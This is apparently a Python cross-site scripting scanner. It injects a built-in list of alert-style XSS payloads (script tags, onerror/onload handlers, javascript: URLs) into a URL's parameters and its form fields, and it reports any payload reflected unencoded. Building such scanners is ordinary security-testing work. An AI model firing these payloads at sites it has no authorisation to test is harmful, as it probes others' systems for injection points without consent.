import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

class XSSScanner:
    """Cross-Site Scripting (XSS) vulnerability scanner"""
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
    ]
    
    def __init__(self, url, timeout=5):
        self.url = url
        self.timeout = timeout
        
    def scan(self):
        """Perform XSS scan"""
        results = {
            'url': self.url,
            'vulnerabilities': [],
            'forms_tested': 0,
            'parameters_tested': 0,
            'vulnerable_points': []
        }
        
        try:
            # Test URL parameters
            url_vulns = self._test_url_parameters()
            results['vulnerabilities'].extend(url_vulns)
            
            # Test forms
            form_vulns = self._test_forms()
            results['vulnerabilities'].extend(form_vulns)
            
            results['risk_level'] = self._calculate_risk(results)
            
        except Exception as e:
            results['error'] = str(e)
            results['risk_level'] = 'unknown'
        
        return results
    
    def _test_url_parameters(self):
        """Test URL parameters for XSS"""
        vulnerabilities = []
        
        try:
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            
            if not params:
                return vulnerabilities
            
            for param_name in params.keys():
                for payload in self.XSS_PAYLOADS[:3]:  # Test first 3 payloads
                    if self._test_reflection(param_name, payload):
                        vulnerabilities.append({
                            'type': 'reflected_xss',
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'high',
                            'description': f'Reflected XSS vulnerability in parameter: {param_name}'
                        })
                        break
                        
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_reflection(self, param_name, payload):
        """Test if payload is reflected in response"""
        try:
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            params[param_name] = payload
            
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            
            response = requests.get(new_url, timeout=self.timeout)
            
            # Check if payload is reflected without encoding
            if payload in response.text:
                return True
            
            return False
            
        except Exception:
            return False
    
    def _test_forms(self):
        """Test forms for XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            response = requests.get(self.url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                # Get form action URL
                form_url = urljoin(self.url, action)
                
                # Get all input fields
                inputs = form.find_all(['input', 'textarea'])
                
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        # Test with simple payload
                        payload = self.XSS_PAYLOADS[0]
                        
                        data = {input_name: payload}
                        
                        try:
                            if method == 'post':
                                resp = requests.post(form_url, data=data, timeout=self.timeout)
                            else:
                                resp = requests.get(form_url, params=data, timeout=self.timeout)
                            
                            if payload in resp.text:
                                vulnerabilities.append({
                                    'type': 'form_xss',
                                    'form_action': form_url,
                                    'input_name': input_name,
                                    'method': method,
                                    'payload': payload,
                                    'severity': 'high',
                                    'description': f'XSS vulnerability in form input: {input_name}'
                                })
                        except Exception:
                            continue
                            
        except Exception:
            pass
        
        return vulnerabilities
    
    def _calculate_risk(self, results):
        """Calculate risk level"""
        vuln_count = len(results['vulnerabilities'])
        
        if vuln_count >= 3:
            return 'critical'
        elif vuln_count >= 1:
            return 'high'
        else:
            return 'low'